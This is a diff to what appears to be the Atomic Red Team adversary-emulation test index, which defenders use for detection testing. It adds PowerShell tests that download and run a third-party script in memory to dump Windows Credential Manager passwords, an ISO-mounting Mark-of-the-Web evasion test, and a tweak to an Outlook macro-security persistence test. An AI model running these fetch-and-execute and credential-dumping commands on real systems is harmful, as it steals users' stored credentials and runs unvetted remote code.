@@ -1055,6 +1055,32 @@ credential-access:
 
 '
         name: powershell
+    - name: Dump credentials from Windows Credential Manager With PowerShell [windows
+        Credentials]
+      auto_generated_guid: c89becbe-1758-4e7d-a0f4-97d2188a23e3
+      description: This module will extract the credentials from Windows Credential
+        Manager
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1'
+          -UseBasicParsing); Get-PasswordVaultCredentials -Force   \n"
+    - name: Dump credentials from Windows Credential Manager With PowerShell [web
+        Credentials]
+      auto_generated_guid: 8fd5a296-6772-4766-9991-ff4e92af7240
+      description: This module will extract the credentials from Windows Credential
+        Manager
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1''
+          -UseBasicParsing); Get-CredManCreds -Force
+
+'
   T1555.003:
     technique:
       created: '2020-02-12T18:57:36.041Z'
@@ -27232,7 +27258,7 @@ defense-evasion:
         path_of_iso:
           description: Path to ISO file
           type: path
-          default: PathToAtomicsFolder\T1553.005\src\T1553.005.iso
+          default: PathToAtomicsFolder\T1553.005\bin\T1553.005.iso
       dependency_executor_name: powershell
       dependencies:
       - description: 'T1553.005.iso must exist on disk at specified location (#{path_of_iso})
@@ -27243,14 +27269,50 @@ defense-evasion:
 '
         get_prereq_command: |
           New-Item -Type Directory (split-path #{path_of_iso}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/src/T1553.005.iso -OutFile "#{path_of_iso}"
+          Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/T1553.005.iso -OutFile "#{path_of_iso}"
       executor:
         command: 'Mount-DiskImage -ImagePath "#{path_of_iso}"
 
 '
-        cleanup_command: 'Dismount-DiskImage -ImagePath "#{path_of_iso}"
+        cleanup_command: 'Dismount-DiskImage -ImagePath "#{path_of_iso}" | Out-Null
 
 '
+        name: powershell
+    - name: Mount an ISO image and run executable from the ISO
+      auto_generated_guid: 42f22b00-0242-4afc-a61b-0da05041f9cc
+      description: "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web
+        and run hello.exe executable from the ISO. \nUpon successful execution, powershell
+        will download the .iso from the Atomic Red Team repo, mount the image, and
+        run the executable from the ISO image that will open command prompt echoing
+        \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620
+        Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,
+        \ "
+      supported_platforms:
+      - windows
+      input_arguments:
+        path_of_iso:
+          description: Path to ISO file
+          type: path
+          default: PathToAtomicsFolder\T1553.005\bin\FeelTheBurn.iso
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'FeelTheBurn.iso must exist on disk at specified location (#{path_of_iso})
+
+'
+        prereq_command: 'if (Test-Path #{path_of_iso}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{path_of_iso}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/FeelTheBurn.iso -OutFile "#{path_of_iso}"
+      executor:
+        command: |
+          $keep = Mount-DiskImage -ImagePath "#{path_of_iso}" -StorageType ISO -Access ReadOnly
+          $driveLetter = ($keep | Get-Volume).DriveLetter
+          invoke-item "$($driveLetter):\hello.exe"
+        cleanup_command: |
+          Dismount-DiskImage -ImagePath "#{path_of_iso}" | Out-Null
+          Stop-process -name "hello" -Force -ErrorAction ignore
         name: powershell
   T1036.004:
     technique:
@@ -41743,8 +41805,8 @@ persistence:
       - windows
       executor:
         command: |
-          reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /t REG_DWORD /d 4
-          if not exist  %APPDATA%\Microsoft\Outlook ( md %APPDATA%\Microsoft\Outlook\ )
+          reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /t REG_DWORD /d 4 /f
+          mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1
           echo "Atomic Red Team TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
         cleanup_command: |
           reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /f
